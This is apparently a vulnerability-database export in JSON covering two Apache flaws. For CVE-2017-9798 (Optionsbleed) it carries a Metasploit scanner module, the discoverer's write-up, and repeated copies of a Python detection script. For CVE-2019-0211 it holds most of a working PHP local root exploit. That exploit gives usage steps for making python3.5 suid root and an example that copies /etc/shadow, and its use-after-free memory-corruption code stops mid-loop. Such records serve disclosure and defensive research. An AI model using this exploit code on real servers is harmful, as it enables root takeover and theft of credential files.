{
    "CVE-2017-9798": [
        {
            "bulletinFamily": "exploit",
            "description": "This module scans for the Apache optionsbleed vulnerability where the Allow response header returned from an OPTIONS request may bleed memory if the server has a .htaccess file with an invalid Limit method defined.\n",
            "modified": "2018-08-27T18:11:22",
            "published": "2017-09-27T02:09:07",
            "id": "MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED",
            "href": "",
            "type": "metasploit",
            "title": "Apache Optionsbleed Scanner",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Apache Optionsbleed Scanner',\n      'Description' => %q{\n        This module scans for the Apache optionsbleed vulnerability where the Allow\n        response header returned from an OPTIONS request may bleed memory if the\n        server has a .htaccess file with an invalid Limit method defined.\n      },\n      'Author' => [\n        'Hanno B\u00f6ck', # Vulnerability discovery\n        'h00die', # Metasploit module\n      ],\n      'References' => [\n        [ 'CVE', '2017-9798' ],\n        [ 'EDB', '42745' ],\n        [ 'URL', 'https://github.com/hannob/optionsbleed' ],\n        [ 'URL', 'https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html' ]\n      ],\n      'DisclosureDate' => 'Sep 18 2017',\n      'License' => MSF_LICENSE,\n      'Notes' =>\n          {\n              'AKA' => ['Optionsbleed']\n          }\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The URI to the folder with the vulnerable .htaccess file', '/']),\n      OptInt.new('REPEAT', [true, 'Times to attempt', 40]),\n      OptBool.new('BUGS', [true, 'Print if any other Allow header bugs are found', true])\n    ])\n  end\n\n  def get_allow_header(ip)\n    res = send_request_raw({\n      'version' => '1.1',\n      'method'  => 'OPTIONS',\n      'uri'     => datastore['TARGETURI']\n    }, 10)\n\n    fail_with(Failure::Unreachable, \"#{peer} - Failed to respond\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - No Allow header identified\") unless res.headers['Allow']\n    res.headers['Allow']\n  end\n\n  def run_host(ip)\n    # Apache bug 61207 regex\n    bug_61207 = /^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$/\n    # Launchpad bug 1717682 regex\n    bug_1717682 = /^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$/\n    uniques = []\n    already_reported = false\n\n    for counter in 1..datastore['REPEAT']\n      allows = get_allow_header(ip)\n      next if uniques.include?(allows) # no need to re-process non-new items\n      uniques << allows\n      if allows =~ bug_61207\n        if allows.split(',').length > allows.split(',').uniq.length # check for repeat items\n          print_status('Some methods were sent multiple times in the list. ' +\n                       'This is a bug, but harmless. It may be Apache bug #61207.') if datastore['BUGS']\n        else\n          vprint_status(\"Request #{counter}: [Standard Response] -> #{allows}\")\n        end\n      elsif allows =~ bug_1717682 && datastore['BUGS']\n        print_status('The list of methods was space-separated instead of comma-separated. ' +\n                     'This is a bug, but harmless. It may be Launchpad bug #1717682.')\n      else\n        print_good(\"Request #{counter}: [OptionsBleed Response] -> #{allows}\")\n      end\n      next unless already_reported\n        report_vuln(\n          :host => ip,\n          :port => rport,\n          :name => self.name,\n          :refs => self.references\n        )\n        already_reported = true\n    end\n  end\nend\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:N/AC:L/Au:N/C:P/I:N/A:N"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED"
        },
        {
            "bulletinFamily": "exploit",
            "description": "If you're using the HTTP protocol in everday Internet use you are usually only using two of its methods: GET and POST. However HTTP has a number of other methods, so I wondered what you can do with them and if there are any vulnerabilities.\r\n\r\nOne HTTP method is called OPTIONS. It simply allows asking a server which other HTTP methods it supports. The server answers with the \"Allow\" header and gives us a comma separated list of supported methods.\r\n\r\nA scan of the Alexa Top 1 Million revealed something strange: Plenty of servers sent out an \"Allow\" header with what looked like corrupted data. Some examples:\r\n```\r\nAllow: ,GET,,,POST,OPTIONS,HEAD,,\r\nAllow: POST,OPTIONS,,HEAD,:09:44 GMT\r\nAllow: GET,HEAD,OPTIONS,,HEAD,,HEAD,,HEAD,, HEAD,,HEAD,,HEAD,,HEAD,POST,,HEAD,, HEAD,!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"\r\nAllow: GET,HEAD,OPTIONS,=write HTTP/1.0,HEAD,,HEAD,POST,,HEAD,TRACE\r\n```\r\n![](https://images.seebug.org/1505800657517)\r\n\r\n\r\nThat clearly looked interesting - and dangerous. It suspiciously looked like a \"bleed\"-style bug, which has become a name for bugs where arbitrary pieces of memory are leaked to a potential attacker. However these were random servers on the Internet, so at first I didn't know what software was causing this.\r\n\r\nSometimes HTTP servers send a \"Server\" header telling the software. However one needs to be aware that the \"Server\" header can lie. It's quite common to have one HTTP server proxying another. I got all kinds of different \"Server\" headers back, but I very much suspected that these were all from the same bug.\r\n\r\nI tried to contact the affected server operators, but only one of them answered, and he was extremely reluctant to tell me anything about his setup, so that wasn't very helpful either.\r\n\r\nHowever I got one clue: Some of the corrupted headers contained strings that were clearly configuration options from Apache. It seemed quite unlikely that those would show up in the memory of other server software. But I was unable to reproduce anything alike on my own Apache servers. I also tried reading the code that put together the Allow header to see if I can find any clues, but with no success. So without knowing any details I contacted the Apache security team.\r\n\r\nFortunately Apache developer Jacob Champion digged into it and figured out what was going on: Apache supports a configuration directive Limit that allows restricting access to certain HTTP methods to a specific user. And if one sets the [Limit](https://httpd.apache.org/docs/2.4/mod/core.html#limit) directive in an .htaccess file for an HTTP method that's not globally registered in the server then the corruption happens. After that I was able to reproduce it myself. Setting a Limit directive for any invalid HTTP method in an .htaccess file caused a use after free error in the construction of the Allow header which was also [detectable with Address Sanitizer](https://blog.fuzzing-project.org/uploads/optionsbleed-asan.txt). (However ASAN doesn't work reliable due to the memory allocation abstraction done by APR.)\r\n\r\n### FAQ\r\n\r\n#### What's Optionsbleed?\r\n\r\nOptionsbleed is a use after free error in Apache HTTP that causes a corrupted Allow header to be constructed in response to HTTP OPTIONS requests. This can leak pieces of arbitrary memory from the server process that may contain secrets. The memory pieces change after multiple requests, so for a vulnerable host an arbitrary number of memory chunks can be leaked.\r\n\r\nThe bug appears if a webmaster tries to use the \"Limit\" directive with an invalid HTTP method.\r\n\r\nExample `.htaccess`:\r\n```\r\n<Limit abcxyz>\r\n</Limit>\r\n```\r\n\r\n#### How prevalent is it?\r\n\r\nScanning the Alexa Top 1 Million revealed 466 hosts with corrupted Allow headers. In theory it's possible that other server software has similar bugs. On the other hand this bug is nondeterministic, so not all vulnerable hosts may have been catched.\r\n\r\n#### So it only happens if you set a quite unusual configuration option?\r\n\r\nThere's an additional risk in shared hosting environments. The corruption is not limited to a single virtual host. One customer of a shared hosting provider could deliberately create an .htaccess file causing this corruption hoping to be able to extract secret data from other hosts on the same system.\r\n\r\n#### I can't reproduce it!\r\n\r\nDue to its nature the bug doesn't appear deterministically. It only seems to appear on busy servers. Sometimes it only appears after multiple requests.\r\n\r\n#### Does it have a CVE?\r\n\r\n[CVE-2017-9798](https://nvd.nist.gov/vuln/detail/CVE-2017-9798).\r\n\r\n#### I'm seeing Allow headers containing HEAD multiple times!\r\n\r\nThis is actually a different Apache bug ([#61207](https://bz.apache.org/bugzilla/show_bug.cgi?id=61207)) that I found during this investigation. It causes HEAD to appear three times instead of once. However it's harmless and not a security bug.\r\n\r\nLaunchpad also has [a harmless bug that produces a malformed Allow header](https://bugs.launchpad.net/launchpad/+bug/1717682), using a space-separated list instead of a comma-separated one.\r\n\r\n#### How can I test it?\r\n\r\nA simple way is to use Curl in a loop and send OPTIONS requests:\r\n```\r\nfor i in {1..100}; do curl -sI -X OPTIONS https://www.google.com/|grep -i \"allow:\"; done\r\n```\r\nDepending on the server configuration it may not answer to OPTIONS requests on some URLs. Try different paths, HTTP versus HTTPS hosts, non-www versus www etc. may lead to different results.\r\n\r\nPlease note that this bug does not show up with the \"*\" OPTIONS target, you need a specific path.\r\n\r\nHere's a [python proof of concept script](https://github.com/hannob/optionsbleed).\r\n\r\n#### What shall I do?\r\n\r\nIf you run an Apache web server you should update. Most distributions should have updated packages by now or very soon. A patch can [be found here](https://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/server/core.c?r1=1805223&r2=1807754&pathrev=1807754&view=patch). A patch for Apache 2.2 is [available here](https://blog.fuzzing-project.org/uploads/apache-2.2-optionsbleed-backport.patch) (thanks to Thomas Deutschmann for backporting it).\r\n\r\nUnfortunately the communication with the Apache security team wasn't ideal. They were unable to provide a timeline for a coordinated release with a fix, so I decided to define a disclosure date on my own without an upstream fix.\r\n\r\nIf you run an Apache web server in a shared hosting environment that allows users to create .htaccess files you should drop everything you do right now, update immediately and make sure you restart the server afterwards.\r\n\r\n#### Is this as bad as Heartbleed?\r\n\r\nNo. Although similar in nature, this bug leaks only small chunks of memory and more importantly only affects a small number of hosts by default.\r\n\r\nIt's still a pretty bad bug, particularly for shared hosting environments.",
            "modified": "2017-09-19T00:00:00",
            "published": "2017-09-19T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-96537",
            "id": "SSV:96537",
            "type": "seebug",
            "title": "HTTP OPTIONS method can leak Apache's server memory(CVE-2017-9798)\n                      (Optionsbleed)",
            "sourceData": "\n                                                #!/usr/bin/env python3\r\n\r\n# Optionsbleed proof of concept test\r\n# by Hanno B\u00f6ck\r\n\r\nimport argparse\r\nimport urllib3\r\nimport re\r\n\r\n\r\ndef test_bleed(url, args):\r\n    r = pool.request('OPTIONS', url)\r\n    try:\r\n        allow = str(r.headers[\"Allow\"])\r\n    except KeyError:\r\n        return False\r\n    if allow in dup:\r\n        return\r\n    dup.append(allow)\r\n    if allow == \"\":\r\n        print(\"[empty] %s\" % (url))\r\n    elif re.match(\"^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$\", allow):\r\n        z = [x.strip() for x in allow.split(',')]\r\n        if len(z) > len(set(z)):\r\n            print(\"[duplicates] %s: %s\" % (url, repr(allow)))\r\n        elif args.all:\r\n            print(\"[ok] %s: %s\" % (url, repr(allow)))\r\n    elif re.match(\"^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$\", allow):\r\n        print(\"[spaces] %s: %s\" % (url, repr(allow)))\r\n    else:\r\n        print(\"[bleed] %s: %s\" % (url, repr(allow)))\r\n    return True\r\n\r\n\r\nparser = argparse.ArgumentParser(\r\n         description='Check for the Optionsbleed vulnerability (CVE-2017-9798).',\r\n         epilog=\"Tests server for Optionsbleed bug and other bugs in the allow header.\\n\\n\"\r\n         \"Automatically checks http://, https://, http://www. and https://www. -\\n\"\r\n         \"except if you pass -u/--url (which means by default we check 40 times.)\\n\\n\"\r\n         \"Explanation of results:\\n\"\r\n         \"[bleed] corrupted header found, vulnerable\\n\"\r\n         \"[empty] empty allow header, does not make sense\\n\"\r\n         \"[spaces] space-separated method list (should be comma-separated)\\n\"\r\n         \"[duplicates] duplicates in list (may be apache bug 61207)\\n\"\r\n         \"[ok] normal list found (only shown with -a/--all)\\n\",\r\n         formatter_class=argparse.RawTextHelpFormatter)\r\nparser.add_argument('hosttocheck',  action='store',\r\n                    help='The hostname you want to test against')\r\nparser.add_argument('-n', nargs=1, type=int, default=[10],\r\n                    help='number of tests (default 10)')\r\nparser.add_argument(\"-a\", \"--all\", action=\"store_true\",\r\n                    help=\"show headers from hosts without problems\")\r\nparser.add_argument(\"-u\", \"--url\", action='store_true',\r\n                    help=\"pass URL instead of hostname\")\r\nargs = parser.parse_args()\r\nhowoften = int(args.n[0])\r\n\r\ndup = []\r\n\r\n# Note: This disables warnings about the lack of certificate verification.\r\n# Usually this is a bad idea, but for this tool we want to find vulnerabilities\r\n# even if they are shipped with invalid certificates.\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n\r\npool = urllib3.PoolManager(10, cert_reqs='CERT_NONE')\r\n\r\nif args.url:\r\n    test_bleed(args.hosttocheck, args)\r\nelse:\r\n    for prefix in ['http://', 'http://www.', 'https://', 'https://www.']:\r\n        for i in range(howoften):\r\n            try:\r\n                if test_bleed(prefix+args.hosttocheck, args) is False:\r\n                    break\r\n            except Exception as e:\r\n                pass\n                              ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:96537"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for linux platform in category web applications",
            "modified": "2017-09-18T00:00:00",
            "published": "2017-09-18T00:00:00",
            "href": "https://0day.today/exploit/description/28573",
            "id": "1337DAY-ID-28573",
            "title": "Apache - HTTP OPTIONS Memory Leak Exploit",
            "type": "zdt",
            "sourceData": "#!/usr/bin/env python3\r\n \r\n# Optionsbleed proof of concept test\r\n# by Hanno B\u00f6ck\r\n \r\nimport argparse\r\nimport urllib3\r\nimport re\r\n \r\n \r\ndef test_bleed(url, args):\r\n    r = pool.request('OPTIONS', url)\r\n    try:\r\n        allow = str(r.headers[\"Allow\"])\r\n    except KeyError:\r\n        return False\r\n    if allow in dup:\r\n        return\r\n    dup.append(allow)\r\n    if allow == \"\":\r\n        print(\"[empty] %s\" % (url))\r\n    elif re.match(\"^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$\", allow):\r\n        z = [x.strip() for x in allow.split(',')]\r\n        if len(z) > len(set(z)):\r\n            print(\"[duplicates] %s: %s\" % (url, repr(allow)))\r\n        elif args.all:\r\n            print(\"[ok] %s: %s\" % (url, repr(allow)))\r\n    elif re.match(\"^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$\", allow):\r\n        print(\"[spaces] %s: %s\" % (url, repr(allow)))\r\n    else:\r\n        print(\"[bleed] %s: %s\" % (url, repr(allow)))\r\n    return True\r\n \r\n \r\nparser = argparse.ArgumentParser(\r\n         description='Check for the Optionsbleed vulnerability (CVE-2017-9798).',\r\n         epilog=\"Tests server for Optionsbleed bug and other bugs in the allow header.\\n\\n\"\r\n         \"Autmatically checks http://, https://, http://www. and https://www. -\\n\"\r\n         \"except if you pass -u/--url (which means by default we check 40 times.)\\n\\n\"\r\n         \"Explanation of results:\\n\"\r\n         \"[bleed] corrupted header found, vulnerable\\n\"\r\n         \"[empty] empty allow header, does not make sense\\n\"\r\n         \"[spaces] space-separated method list (should be comma-separated)\\n\"\r\n         \"[duplicates] duplicates in list (may be apache bug 61207)\\n\"\r\n         \"[ok] normal list found (only shown with -a/--all)\\n\",\r\n         formatter_class=argparse.RawTextHelpFormatter)\r\nparser.add_argument('hosttocheck',  action='store',\r\n                    help='The hostname you want to test against')\r\nparser.add_argument('-n', nargs=1, type=int, default=[10],\r\n                    help='number of tests (default 10)')\r\nparser.add_argument(\"-a\", \"--all\", action=\"store_true\",\r\n                    help=\"show headers from hosts without problems\")\r\nparser.add_argument(\"-u\", \"--url\", action='store_true',\r\n                    help=\"pass URL instead of hostname\")\r\nargs = parser.parse_args()\r\nhowoften = int(args.n[0])\r\n \r\ndup = []\r\n \r\n# Note: This disables warnings about the lack of certificate verification.\r\n# Usually this is a bad idea, but for this tool we want to find vulnerabilities\r\n# even if they are shipped with invalid certificates.\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n \r\npool = urllib3.PoolManager(10, cert_reqs='CERT_NONE')\r\n \r\nif args.url:\r\n    test_bleed(args.hosttocheck, args)\r\nelse:\r\n    for prefix in ['http://', 'http://www.', 'https://', 'https://www.']:\r\n        for i in range(howoften):\r\n            try:\r\n                if test_bleed(prefix+args.hosttocheck, args) is False:\r\n                    break\r\n            except Exception as e:\r\n                pass\n\n#  0day.today [2018-04-01]  #",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-28573"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache - HTTP OPTIONS Memory Leak. CVE-2017-9798. Webapps exploit for Linux platform",
            "modified": "2017-09-18T00:00:00",
            "published": "2017-09-18T00:00:00",
            "id": "EDB-ID:42745",
            "href": "https://www.exploit-db.com/exploits/42745/",
            "type": "exploitdb",
            "title": "Apache - HTTP OPTIONS Memory Leak",
            "sourceData": "#!/usr/bin/env python3\r\n\r\n# Optionsbleed proof of concept test\r\n# by Hanno B\u00c3\u00b6ck\r\n\r\nimport argparse\r\nimport urllib3\r\nimport re\r\n\r\n\r\ndef test_bleed(url, args):\r\n    r = pool.request('OPTIONS', url)\r\n    try:\r\n        allow = str(r.headers[\"Allow\"])\r\n    except KeyError:\r\n        return False\r\n    if allow in dup:\r\n        return\r\n    dup.append(allow)\r\n    if allow == \"\":\r\n        print(\"[empty] %s\" % (url))\r\n    elif re.match(\"^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$\", allow):\r\n        z = [x.strip() for x in allow.split(',')]\r\n        if len(z) > len(set(z)):\r\n            print(\"[duplicates] %s: %s\" % (url, repr(allow)))\r\n        elif args.all:\r\n            print(\"[ok] %s: %s\" % (url, repr(allow)))\r\n    elif re.match(\"^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$\", allow):\r\n        print(\"[spaces] %s: %s\" % (url, repr(allow)))\r\n    else:\r\n        print(\"[bleed] %s: %s\" % (url, repr(allow)))\r\n    return True\r\n\r\n\r\nparser = argparse.ArgumentParser(\r\n         description='Check for the Optionsbleed vulnerability (CVE-2017-9798).',\r\n         epilog=\"Tests server for Optionsbleed bug and other bugs in the allow header.\\n\\n\"\r\n         \"Autmatically checks http://, https://, http://www. and https://www. -\\n\"\r\n         \"except if you pass -u/--url (which means by default we check 40 times.)\\n\\n\"\r\n         \"Explanation of results:\\n\"\r\n         \"[bleed] corrupted header found, vulnerable\\n\"\r\n         \"[empty] empty allow header, does not make sense\\n\"\r\n         \"[spaces] space-separated method list (should be comma-separated)\\n\"\r\n         \"[duplicates] duplicates in list (may be apache bug 61207)\\n\"\r\n         \"[ok] normal list found (only shown with -a/--all)\\n\",\r\n         formatter_class=argparse.RawTextHelpFormatter)\r\nparser.add_argument('hosttocheck',  action='store',\r\n                    help='The hostname you want to test against')\r\nparser.add_argument('-n', nargs=1, type=int, default=[10],\r\n                    help='number of tests (default 10)')\r\nparser.add_argument(\"-a\", \"--all\", action=\"store_true\",\r\n                    help=\"show headers from hosts without problems\")\r\nparser.add_argument(\"-u\", \"--url\", action='store_true',\r\n                    help=\"pass URL instead of hostname\")\r\nargs = parser.parse_args()\r\nhowoften = int(args.n[0])\r\n\r\ndup = []\r\n\r\n# Note: This disables warnings about the lack of certificate verification.\r\n# Usually this is a bad idea, but for this tool we want to find vulnerabilities\r\n# even if they are shipped with invalid certificates.\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n\r\npool = urllib3.PoolManager(10, cert_reqs='CERT_NONE')\r\n\r\nif args.url:\r\n    test_bleed(args.hosttocheck, args)\r\nelse:\r\n    for prefix in ['http://', 'http://www.', 'https://', 'https://www.']:\r\n        for i in range(howoften):\r\n            try:\r\n                if test_bleed(prefix+args.hosttocheck, args) is False:\r\n                    break\r\n            except Exception as e:\r\n                pass",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:42745"
        }
    ],
    "CVE-2019-0211": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2019-04-08T00:00:00",
            "published": "2019-04-08T00:00:00",
            "id": "PACKETSTORM:152441",
            "href": "https://packetstormsecurity.com/files/152441/CARPE-DIEM-Apache-2.4.x-Local-Privilege-Escalation.html",
            "title": "CARPE (DIEM) Apache 2.4.x Local Privilege Escalation",
            "type": "packetstorm",
            "sourceData": "`<?php  \n# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation  \n# Charles Fol  \n# @cfreal_  \n# 2019-04-08  \n#  \n# INFOS  \n#  \n# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html  \n#  \n# USAGE  \n#  \n# 1. Upload exploit to Apache HTTP server  \n# 2. Send request to page  \n# 3. Await 6:25AM for logrotate to restart Apache  \n# 4. python3.5 is now suid 0  \n#  \n# You can change the command that is ran as root using the cmd HTTP  \n# parameter (GET/POST).  \n# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/  \n#  \n# SUCCESS RATE  \n#  \n# Number of successful and failed exploitations relative to of the number  \n# of MPM workers (i.e. Apache subprocesses). YMMV.  \n#  \n# W --% S F  \n# 5 87% 177 26 (default)  \n# 8 89% 60 8  \n# 10 95% 70 4  \n#  \n# More workers, higher success rate.  \n# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.  \n# Generally, failure is due to all_buckets being relocated too far from its  \n# original address.  \n#  \n# TESTED ON  \n#  \n# - Apache/2.4.25  \n# - PHP 7.2.12  \n# - Debian GNU/Linux 9.6  \n#  \n# TESTING  \n#  \n# $ curl http://localhost/cfreal-carpediem.php  \n# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force  \n# $ ls -alh /usr/bin/python3.5  \n# -rwsr-sr-x 2 root root 4.6M Sep 27 2018 /usr/bin/python3.5  \n#  \n# There are no hardcoded addresses.  \n# - Addresses read through /proc/self/mem  \n# - Offsets read through ELF parsing  \n#  \n# As usual, there are tons of comments.  \n#  \n  \n  \no('CARPE (DIEM) ~ CVE-2019-0211');  \no('');  \n  \nerror_reporting(E_ALL);  \n  \n  \n# Starts the exploit by triggering the UAF.  \nfunction real()  \n{  \nglobal $y;  \n$y = [new Z()];  \njson_encode([0 => &$y]);  \n}  \n  \n# In order to read/write what comes after in memory, we need to UAF a string so  \n# that we can control its size and make in-place edition.  \n# An easy way to do that is to replace the string by a timelib_rel_time  \n# structure of which the first bytes can be reached by the (y, m, d, h, i, s)  \n# properties of the DateInterval object.  \n#  \n# Steps:  \n# - Create a base object (Z)  \n# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)  \n# - Create DateInterval object ($place) meant to be unset and filled by another  \n# - Trigger the UAF by unsetting $y[0], which is still reachable using $this  \n# - Unset $place: at this point, if we create a new DateInterval object, it will  \n# replace $place in memory  \n# - Create a string ($holder) that fills $place's timelib_rel_time structure  \n# - Allocate a new DateInterval object: its timelib_rel_time structure will  \n# end up in place of abc  \n# - Now we can control $this->abc's zend_string structure entirely using  \n# y, m, d etc.  \n# - Increase abc's size so that we can read/write memory that comes after it,  \n# especially the shared memory block  \n# - Find out all_buckets' position by finding a memory region that matches the  \n# mutex->meth structure  \n# - Compute the bucket index required to reach the SHM and get an arbitrary  \n# function call  \n# - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the  \n# bucket  \nclass Z implements JsonSerializable  \n{  \npublic function jsonSerialize()  \n{  \nglobal $y, $addresses, $workers_pids;  \n  \n#  \n# Setup memory  \n#  \no('Triggering UAF');  \no(' Creating room and filling empty spaces');  \n  \n# Fill empty blocks to make sure our allocations will be contiguous  \n# I: Since a lot of allocations/deallocations happen before the script  \n# is ran, two variables instanciated at the same time might not be  \n# contiguous: this can be a problem for a lot of reasons.  \n# To avoid this, we instanciate several DateInterval objects. These  \n# objects will fill a lot of potentially non-contiguous memory blocks,  \n# ensuring we get \"fresh memory\" in upcoming allocations.  \n$contiguous = [];  \nfor($i=0;$i<10;$i++)  \n$contiguous[] = new DateInterval('PT1S');  \n  \n# Create some space for our UAF blocks not to get overwritten  \n# I: A PHP object is a combination of a lot of structures, such as  \n# zval, zend_object, zend_object_handlers, zend_string, etc., which are  \n# all allocated, and freed when the object is destroyed.  \n# After the UAF is triggered on the object, all the structures that are  \n# used to represent it will be marked as free.  \n# If we create other variables afterwards, those variables might be  \n# allocated in the object's previous memory regions, which might pose  \n# problems for the rest of the exploitation.  \n# To avoid this, we allocate a lot of objects before the UAF, and free  \n# them afterwards. Since PHP's heap is LIFO, when we create other vars,  \n# they will take the place of those objects instead of the object we  \n# are triggering the UAF on. This means our object is \"shielded\" and  \n# we don't have to worry about breaking it.  \n$room = [];  \nfor($i=0;$i<10;$i++)  \n$room[] = new Z();  \n  \n# Build string meant to fill old DateInterval's timelib_rel_time  \n# I: ptr2str's name is unintuitive here: we just want to allocate a  \n# zend_string of size 78.  \n$_protector = ptr2str(0, 78);  \n  \no(' Allocating $abc and $p');  \n  \n# Create ABC  \n# I: This is the variable we will use to R/W memory afterwards.  \n# After we free the Z object, we'll make sure abc is overwritten by a  \n# timelib_rel_time structure under our control. The first 8*8 = 64 bytes  \n# of this structure can be modified easily, meaning we can change the  \n# size of abc. This will allow us to read/write memory after abc.  \n$this->abc = ptr2str(0, 79);  \n  \n# Create $p meant to protect $this's blocks  \n# I: Right after we trigger the UAF, we will unset $p.  \n# This means that the timelib_rel_time structure (TRT) of this object  \n# will be freed. We will then allocate a string ($protector) of the same  \n# size as TRT. Since PHP's heap is LIFO, the string will take the place  \n# of the now-freed TRT in memory.  \n# Then, we create a new DateInterval object ($x). From the same  \n# assumption, every structure constituting this new object will take the  \n# place of the previous structure. Nevertheless, since TRT's memory  \n# block has already been replaced by $protector, the new TRT will be put  \n# in the next free blocks of the same size, which happens to be $abc  \n# (remember, |abc| == |timelib_rel_time|).  \n# We now have the following situation: $x is a DateInterval object whose  \n# internal TRT structure has the same address as $abc's zend_string.  \n$p = new DateInterval('PT1S');  \n  \n#  \n# Trigger UAF  \n#  \n  \no(' Unsetting both variables and setting $protector');  \n# UAF here, $this is usable despite being freed  \nunset($y[0]);  \n# Protect $this's freed blocks  \nunset($p);  \n  \n# Protect $p's timelib_rel_time structure  \n$protector = \".$_protector\";  \n# !!! This is only required for apache  \n# Got no idea as to why there is an extra deallocation (?)  \n$room[] = \"!$_protector\";  \n  \no(' Creating DateInterval object');  \n# After this line:  \n# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str  \n# We can control the structure of $this->abc and therefore read/write  \n# anything that comes after it in memory by changing its size and  \n# making in-place edits using $this->abc[$position] = $char  \n$x = new DateInterval('PT1S');  \n# zend_string.refcount = 0  \n# It will get incremented at some point, and if it is > 1,  \n# zend_assign_to_string_offset() will try to duplicate it before making  \n# the in-place replacement  \n$x->y = 0x00;  \n# zend_string.len  \n$x->d = 0x100;  \n# zend_string.val[0-4]  \n$x->h = 0x13121110;  \n  \n# Verify UAF was successful  \n# We modified stuff via $x; they should be visible by $this->abc, since  \n# they are at the same memory location.  \nif(!(  \nstrlen($this->abc) === $x->d &&  \n$this->abc[0] == \"\\x10\" &&  \n$this->abc[1] == \"\\x11\" &&  \n$this->abc[2] == \"\\x12\" &&  \n$this->abc[3] == \"\\x13\"  \n))  \n{  \no('UAF failed, exiting.');  \nexit();  \n}  \no('UAF successful.');  \no('');  \n  \n# Give us some room  \n# I: As indicated before, just unset a lot of stuff so that next allocs  \n# don't break our fragile UAFd structure.  \nunset($room);  \n  \n#  \n# Setup the R/W primitive  \n#  \n  \n# We control $abc's internal zend_string structure, therefore we can R/W  \n# the shared memory block (SHM), but for that we need to know the  \n# position of $abc in memory  \n# I: We know the absolute position of the SHM, so we need to need abc's  \n# as well, otherwise we cannot compute the offset  \n  \n# Assuming the allocation was contiguous, memory looks like this, with  \n# 0x70-sized fastbins:  \n# [zend_string:abc]  \n# [zend_string:protector]  \n# [FREE#1]  \n# [FREE#2]  \n# Therefore, the address of the 2nd free block is in the first 8 bytes  \n# of the first block: 0x70 * 2 - 24  \n$address = str2ptr($this->abc, 0x70 * 2 - 24);  \n# The address we got points to FREE#2, hence we're |block| * 3 higher in  \n# memory  \n$address = $address - 0x70 * 3;  \n# The beginning of the string is 24 bytes after its origin  \n$address = $address + 24;  \no('Address of $abc: 0x' . dechex($address));  \no('');  \n  \n# Compute the size required for our string to include the whole SHM and  \n# apache's memory region  \n$distance =   \nmax($addresses['apache'][1], $addresses['shm'][1]) -  \n$address  \n;  \n$x->d = $distance;  \n  \n# We can now read/write in the whole SHM and apache's memory region.  \n  \n#  \n# Find all_buckets in memory  \n#  \n  \n# We are looking for a structure s.t.  \n# |all_buckets, mutex| = 0x10  \n# |mutex, meth| = 0x8  \n# all_buckets is in apache's memory region  \n# mutex is in apache's memory region  \n# meth is in libaprR's memory region  \n# meth's function pointers are in libaprX's memory region  \no('Looking for all_buckets in memory');  \n$all_buckets = 0;  \n  \nfor(  \n$i = $addresses['apache'][0] + 0x10;  \n$i < $addresses['apache'][1] - 0x08;  \n$i += 8  \n)  \n{  \n# mutex  \n$mutex = $pointer = str2ptr($this->abc, $i - $address);  \nif(!in($pointer, $addresses['apache']))  \ncontinue;  \n  \n  \n# meth  \n$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);  \nif(!in($pointer, $addresses['libaprR']))  \ncontinue;  \n  \no(' [&mutex]: 0x' . dechex($i));  \no(' [mutex]: 0x' . dechex($mutex));  \no(' [meth]: 0x' . dechex($meth));  \n  \n  \n# meth->*  \n# flags  \nif(str2ptr($this->abc, $pointer - $address) != 0)  \ncontinue;  \n# methods  \nfor($j=0;$j<7;$j++)  \n{  